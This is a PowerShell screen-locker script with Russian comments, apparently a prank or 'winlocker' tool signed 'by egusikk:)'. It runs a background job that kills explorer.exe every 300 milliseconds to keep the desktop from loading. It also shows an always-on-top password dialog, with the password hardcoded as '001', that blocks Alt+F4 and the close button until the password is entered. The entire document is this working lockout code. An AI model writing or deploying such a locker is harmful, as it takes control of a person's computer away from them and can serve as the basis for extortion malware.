Add-Type -AssemblyName PresentationFramework
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

# Переменная-флаг для контроля состояния блокировки
$global:Unlocked = $false

# Функция для постоянного подавления Explorer в фоновом потоке
$BlockExplorerJob = {
    while ($true) {
        $explorer = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
        if ($explorer) {
            Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
        }
        Start-Sleep -Milliseconds 300 # Частота проверки, чтобы ОС не успела прогрузить рабочий стол
    }
}

# Запуск фонового процесса блокировки Explorer
$job = Start-Job -ScriptBlock $BlockExplorerJob

function Show-PasswordWindow {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "by egusikk:)"
    $form.Size = New-Object System.Drawing.Size(350, 180)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false
    $form.TopMost = $true 

    $label = New-Object System.Windows.Forms.Label
    $label.Location = New-Object System.Drawing.Point(20, 20)
    $label.Size = New-Object System.Drawing.Size(310, 20)
    $label.Text = "enter pass for unlock:"
    $form.Controls.Add($label)

    $textBox = New-Object System.Windows.Forms.TextBox
    $textBox.Location = New-Object System.Drawing.Point(20, 50)
    $textBox.Size = New-Object System.Drawing.Size(290, 20)
    $textBox.PasswordChar = "*" 
    $form.Controls.Add($textBox)

    $button = New-Object System.Windows.Forms.Button
    $button.Location = New-Object System.Drawing.Point(120, 90)
    $button.Size = New-Object System.Drawing.Size(100, 30)
    $button.Text = "Unlock"
    $form.Controls.Add($button)

    $button.Add_Click({
        if ($textBox.Text -eq "001") {
            $global:Unlocked = $true
            $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
            $form.Close()
        } else {
            [System.Windows.Forms.MessageBox]::Show("Incorrect password!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
            $textBox.Clear()
            $textBox.Focus()
        }
    })

    # Запрещаем закрывать форму через Alt+F4 или крестик
    $form.Add_FormClosing({
        param($_, $e)
        if ($global:Unlocked -eq $false) {
            $e.Cancel = $true
        }
    })

    $form.ShowDialog() | Out-Null
}

# Отображаем окно авторизации
Show-PasswordWindow

# Если пароль верный — останавливаем фоновый убийца процессов и запускаем Explorer
if ($global:Unlocked -eq $true) {
    Stop-Job $job
    Remove-Job $job
    Start-Process "explorer.exe"
}
